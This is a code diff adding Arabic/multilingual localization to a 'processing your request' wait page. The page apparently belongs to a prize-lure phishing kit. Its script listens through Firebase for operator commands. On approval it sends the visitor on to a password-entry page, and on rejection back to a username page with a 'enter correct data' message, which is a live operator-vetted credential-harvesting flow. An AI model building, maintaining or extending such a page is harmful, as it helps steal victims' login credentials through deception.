@@ -1,15 +1,16 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar" dir="rtl" data-page="wait">
 <head>
   <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
   <title>جاري المعالجة</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <script src="/assets/js/site-lang.js?v=1"></script>
   <style>
     *{box-sizing:border-box}body{margin:0;min-height:100vh;font-family:Cairo,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;text-align:center;color:#171717}.box{max-width:420px;padding:24px}.spinner{width:96px;height:96px;margin:auto;border:5px solid #c6282822;border-top-color:#c62828;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}h1{font-size:22px;margin:28px 0 8px}p{color:#69707d;font-size:13px}.bar{width:min(280px,90vw);height:8px;margin:24px auto 0;border-radius:20px;background:#eee;overflow:hidden}.bar i{display:block;width:35%;height:100%;background:#c62828;border-radius:20px;animation:move 1.5s ease-in-out infinite alternate}@keyframes move{to{width:100%}}
   </style>
 </head>
 <body>
-  <main class="box"><div class="spinner"></div><h1>جاري معالجة طلبك</h1><p>يرجى الانتظار وعدم إغلاق الصفحة</p><div class="bar"><i></i></div></main>
+  <main class="box"><div class="spinner"></div><h1 data-i18n="wait.heading">جاري معالجة طلبك</h1><p data-i18n="wait.intro">يرجى الانتظار وعدم إغلاق الصفحة</p><div class="bar"><i></i></div></main>
   <script src="/assets/js/firebase-env.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
@@ -26,12 +27,12 @@
     function __goUsername() {
       if (__prizeHandled) return;
       __prizeHandled = true;
-      try { sessionStorage.setItem('prizeRejectMessage', 'يرجى إدخال بيانات صحيحه واعادة المحاولة'); } catch (e) {}
-      window.location.href = 'prize-username.html';
+      try { sessionStorage.setItem('prizeRejectMessage', window.SiteLang ? SiteLang.t('username.reject') : 'يرجى إدخال بيانات صحيحه واعادة المحاولة'); } catch (e) {}
+      window.location.href = window.SiteLang ? SiteLang.href('prize-username.html') : 'prize-username.html';
     }
     if (window.listenForAdminCommands) {
       window.listenForAdminCommands({
-        onApproval: function () { window.location.href = 'prize-text-password.html'; },
+        onApproval: function () { window.location.href = window.SiteLang ? SiteLang.href('prize-text-password.html') : 'prize-text-password.html'; },
         onRejection: function () { __goUsername(); }
       });
     }
